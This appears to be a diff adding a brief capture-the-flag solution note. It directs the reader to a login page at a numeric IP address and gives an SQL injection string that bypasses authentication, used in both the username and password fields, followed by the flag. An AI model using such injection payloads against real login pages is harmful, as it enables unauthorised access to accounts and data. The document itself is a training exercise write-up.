@@ -1,0 +1,8 @@
+Very basic injection.
+Head over to: http://192.99.244.134:9898/login.php
+For the credentials fill in:
+
+username: " OR 1=1 --
+password: " OR 1=1 --
+
+Flag: must_secure_sql
